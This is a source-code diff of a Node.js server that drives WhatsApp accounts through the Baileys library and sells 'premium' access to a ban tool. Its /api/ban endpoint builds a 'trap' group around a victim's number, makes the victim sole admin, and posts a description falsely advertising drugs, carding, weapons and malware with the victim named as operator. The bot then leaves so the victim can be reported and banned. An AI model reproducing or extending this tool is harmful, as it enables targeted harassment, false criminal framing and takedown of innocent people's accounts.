@@ -1,5 +1,6 @@
 console.clear();
 const express = require('express');
+const http = require('http');
 const path = require('path');
 const fs = require('fs');
 const chalk = require('chalk');
@@ -16,6 +17,7 @@ function loadPremiumDB() {
     try { return JSON.parse(fs.readFileSync(PREMIUM_DB_PATH)); } catch { return { premium: [], resellers: [] }; }
 }
 function savePremiumDB(data) { fs.writeFileSync(PREMIUM_DB_PATH, JSON.stringify(data, null, 2)); }
+function isAdmin(userId) { return userId === 'admin'; }
 function addPremium(userId) {
     const db = loadPremiumDB();
     if (!db.premium.includes(userId.toString())) { db.premium.push(userId.toString()); savePremiumDB(db); return true; }
@@ -33,8 +35,8 @@ function getPremiumList() { return loadPremiumDB().premium; }
 const GROUP_DESCRIPTION = "⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** {target}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.";
 const GROUP_PROFILE_PIC_PATH = path.join(__dirname, 'ghost_ban_profile.jpg');
 
-// ========== BAILEYS SETUP (for ban features) ==========
-let makeWASocket, Browsers, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion;
+// ========== BAILEYS SETUP ==========
+let makeWASocket, Browsers, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, jidDecode, downloadContentFromMessage, jidNormalizedUser;
 
 const loadBaileys = async () => {
     const baileys = await import('@whiskeysockets/baileys');
@@ -44,6 +46,9 @@ const loadBaileys = async () => {
     useMultiFileAuthState = mod.useMultiFileAuthState;
     DisconnectReason = mod.DisconnectReason;
     fetchLatestBaileysVersion = mod.fetchLatestBaileysVersion;
+    jidDecode = mod.jidDecode;
+    downloadContentFromMessage = mod.downloadContentFromMessage;
+    jidNormalizedUser = mod.jidNormalizedUser;
     console.log(chalk.green('✅ Baileys loaded'));
 };
 
@@ -64,7 +69,7 @@ function requireAuth(req, res, next) {
     next();
 }
 
-// ========== WHATSAPP FUNCTIONS (for ban features) ==========
+// ========== WHATSAPP FUNCTIONS ==========
 async function startWhatsAppBot(phoneNumber) {
     const sessionPath = path.join(__dirname, `./sessions/session_${phoneNumber}`);
     if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
@@ -89,10 +94,12 @@ async function startWhatsAppBot(phoneNumber) {
     sock.ev.on('creds.update', saveCreds);
 
     sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect } = update;
+        const { connection, lastDisconnect, qr } = update;
+
         if (connection === 'open') {
             console.log(chalk.green(`✅ ${phoneNumber}: Connected`));
         }
+
         if (connection === 'close') {
             const statusCode = lastDisconnect?.error?.output?.statusCode;
             activeWhatsAppConnections.delete(phoneNumber);
@@ -131,6 +138,7 @@ function spawnPairingProcess(phoneNumber) {
             output += chunk;
             console.log(chalk.gray('[pair.js]'), chunk.trim());
             
+            // Extract code using Anon-Bot pattern
             const match = output.match(/ANON_CODE_START:([A-Z0-9]+):ANON_CODE_END/);
             if (match && !code) {
                 code = match[1];
@@ -154,6 +162,7 @@ function spawnPairingProcess(phoneNumber) {
             }
         });
 
+        // 30 second timeout
         setTimeout(() => {
             if (!responseSent) {
                 responseSent = true;
@@ -171,7 +180,7 @@ app.get('/health', (req, res) => {
     res.json({ status: 'alive', uptime: process.uptime(), connections: activeWhatsAppConnections.size });
 });
 
-// ✅ PAIR: Get pairing code using subprocess
+// ✅ FIXED: Get pairing code using subprocess (like Anon-Bot)
 app.post('/api/pair', requireAuth, async (req, res) => {
     const { phoneNumber } = req.body;
     if (!phoneNumber) return res.status(400).json({ error: 'Phone number required' });
@@ -184,7 +193,7 @@ app.post('/api/pair', requireAuth, async (req, res) => {
     }
 });
 
-// ✅ BAN: Create trap group (target = admin, bot leaves)
+// Ban target (create trap group)
 app.post('/api/ban', requireAuth, async (req, res) => {
     const { targetNumber } = req.body;
     if (!targetNumber) return res.status(400).json({ error: 'Target number required' });
@@ -196,47 +205,19 @@ app.post('/api/ban', requireAuth, async (req, res) => {
         const targetJid = targetNumber + '@s.whatsapp.net';
         const botJid = sock.user.id;
 
-        // 1. Create group with bot + target
         const group = await sock.groupCreate('GHOST BAN TRAP', [botJid, targetJid]);
         const groupJid = group.id;
-        console.log(chalk.cyan(`[i] Group created: ${groupJid}`));
 
-        // 2. Promote target to admin
         await sock.groupParticipantsUpdate(groupJid, [targetJid], 'promote');
-        console.log(chalk.green(`[✓] Target ${targetNumber} promoted to admin`));
         await new Promise(r => setTimeout(r, 1000));
-
-        // 3. Demote bot (owner) - remove admin rights
         await sock.groupParticipantsUpdate(groupJid, [botJid], 'demote');
-        console.log(chalk.yellow(`[✓] Bot demoted from admin`));
         await new Promise(r => setTimeout(r, 1000));
-
-        // 4. Update group description with target info
-        const description = GROUP_DESCRIPTION.replace('{target}', targetNumber);
-        await sock.groupUpdateDescription(groupJid, description);
-        console.log(chalk.green(`[✓] Group description updated`));
+        await updateGroupInfo(sock, groupJid);
         await new Promise(r => setTimeout(r, 1000));
-
-        // 5. Update group profile picture
-        if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
-            const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
-            await sock.updateProfilePicture(groupJid, picBuffer);
-            console.log(chalk.green(`[✓] Group profile picture updated`));
-        }
-        await new Promise(r => setTimeout(r, 1000));
-
-        // 6. Bot leaves group - target is now sole admin
         await sock.groupLeave(groupJid);
-        console.log(chalk.red(`[✓] Bot left group. Target is now sole admin!`));
 
-        res.json({ 
-            success: true, 
-            targetNumber, 
-            groupJid, 
-            message: 'Trap group created! Target is now sole admin. Bot has left.' 
-        });
+        res.json({ success: true, targetNumber, groupJid, message: 'Trap group created. Report manually.' });
     } catch (error) {
-        console.error(chalk.red('[✗] Ban failed:'), error.message);
         res.status(500).json({ error: error.message });
     }
 });
@@ -267,6 +248,15 @@ app.post('/api/delprem', requireAuth, (req, res) => {
 app.get('/api/listprem', requireAuth, (req, res) => {
     res.json({ premium: getPremiumList() });
 });
+
+// Update group info helper
+async function updateGroupInfo(sock, groupJid) {
+    await sock.groupUpdateDescription(groupJid, GROUP_DESCRIPTION);
+    if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
+        const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
+        await sock.updateProfilePicture(groupJid, picBuffer);
+    }
+}
 
 // ========== START SERVER ==========
 async function main() {
